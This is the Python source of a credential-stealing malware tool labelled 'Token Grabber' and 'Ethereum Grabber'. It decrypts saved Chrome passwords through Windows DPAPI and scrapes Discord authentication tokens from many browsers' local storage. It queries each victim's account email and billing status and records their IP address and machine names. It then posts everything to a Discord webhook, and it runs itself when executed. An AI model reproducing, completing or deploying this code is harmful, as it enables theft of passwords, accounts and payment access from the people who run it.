import json, shutil, base64, sqlite3, sys, os, ctypes, requests, re
from colorfull import init; init()
from subprocess import check_output
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.backends import default_backend
import ctypes.wintypes

Webhook_URI = ""

TokenList = []
passwordList = []
Embed = []
IP = requests.get("https://api.ipify.org/").text
Name = os.getenv("UserName")
OS = check_output('wmic os get Caption').decode().split('\n')[1].strip()

def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    return (cipher, cipher.encryptor().update(plaintext), nonce)


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    return cipher.decryptor().update(ciphertext)


def rcipher(key):
    return Cipher(algorithms.AES(key), None, backend=default_backend())


def dpapi(encrypted):
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(DATA_BLOB(ctypes.sizeof(p), p)), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return ctypes.string_at(blobout.pbData, blobout.cbData)


def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions(encrypted_txt):
    return decrypt(rcipher(dpapi(base64.b64decode(localdata().encode())[5:])), encrypted_txt[15:], encrypted_txt[3:15])

def chromedb():
    _full_path = os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Default\Login Data')
    _temp_path = os.path.join(os.environ['LOCALAPPDATA'], 'sqlite_file')
    if os.path.exists(_temp_path):
        os.remove(_temp_path)
    shutil.copyfile(_full_path, _temp_path)
    pwsd(_temp_path)

def pwsd(db_file):
    conn = sqlite3.connect(db_file)
    for row in conn.execute('select signon_realm,username_value,password_value from logins'):
        if row[0].startswith('android'):
            continue
        passwordList.append(f'{row[0]} | {row[1]}:{cdecrypt(row[2])}')
    conn.close()
    os.remove(db_file)

def cdecrypt(encrypted_txt):
    if sys.platform == 'win32':
        try:
            if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                decrypted_txt = dpapi(encrypted_txt)
                return decrypted_txt.decode()
            elif encrypted_txt[:3] == b'v10':
                decrypted_txt = decryptions(encrypted_txt)
                return decrypted_txt[:-16].decode()
        except WindowsError:
            return None

def saved():
    chromedb()
    try:
        with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
            f.writelines(passwordList)
    except WindowsError:
        return None

Discord_Path = {
    os.getenv("APPDATA")      + "\\Discord\\Local Storage\\leveldb",
    os.getenv("APPDATA")      + "\\Lightcord\\Local Storage\\leveldb",
    os.getenv("APPDATA")      + "\\discordptb\\Local Storage\\leveldb",
    os.getenv("APPDATA")      + "\\discordcanary\\Local Storage\\leveldb",
    os.getenv("APPDATA")      + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
    os.getenv("APPDATA")      + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb",
    
    os.getenv("LOCALAPPDATA") + "\\Amigo\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Torch\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Kometa\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Orbitum\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\CentBrowser\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Opera Software\\Opera Neon\\User Data\\Default\\Local Storage\\leveldb", 
    os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
}

def Token_Data(Token):
    return requests.get('https://discord.com/api/v9/users/@me', headers={'authorization': Token, 'Content-Type': 'application/json'}).json()

def Billing_Data(Token):
    return requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers={'authorization': Token, 'Content-Type': 'application/json'}).json()

def SendWebhook(URI, Message):
    requests.post(URI, headers={ "Content-Type": "application/json" }, data=json.dumps({ "content": "","embeds": Message, "username": "Token Grabber • RCΛ", "avatar_url": "https://media.discordapp.net/attachments/913253260712869952/913581898469605376/stanley.gif" }))

def Grabber():
    for path in Discord_Path:
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            for l in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for Token in re.findall(regex, l):
                        if requests.get('https://discord.com/api/v9/users/@me/library', headers={'authorization': Token, 'Content-Type': 'application/json'}).status_code == 200:
                            TokenList.append(Token)

    return TokenList

def StartGrabber():
    saved()
    Grabber()
    
    with open(r"C:\ProgramData\passwords.txt", "r") as password_file:
        passwordList.append(password_file.readlines())


    for Tokens in list(set(TokenList)):
        token_Data = Token_Data(Tokens)

        Username = token_Data["username"] + "#" + token_Data["discriminator"]
        Email = token_Data["email"]
        nitro = bool(token_Data.get("premium_type"))
        billing = bool(Billing_Data(Tokens))
        IP = requests.get("https://api.ipify.org").text
        pc_username = os.getenv("UserName")
        pc_name = os.getenv("COMPUTERNAME")

        for Pass in passwordList:
            embed = {
                "color": 0x080808,
                "fields": [
                    {
                        "name": "Ethereum Grabber",
                        "value": f'```\nIP : {IP}\nPC Username : {pc_username}\nPC Name : {pc_name}\n```',
                        "inline": False
                    },
                    {
                        "name": "**Account Info**",
                        "value": f'Username : `{Username}`\nEmail : `{Email}`\nNitro : `{nitro}`\nBilling Info : `{billing}`',
                        "inline": False
                    },
                    {
                        "name": "**Chrome Password**",
                        "value": f'```\n{Pass}\n```',
                        "inline": False
                    },
                    {
                        "name": "**Token**",
                        "value": f"`{Tokens}`",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": f"Ethereum Grabber | !\" Monsτεгεd#1337",
                }
            }
            Embed.append(embed)

    SendWebhook(Webhook_URI, Embed)

StartGrabber()
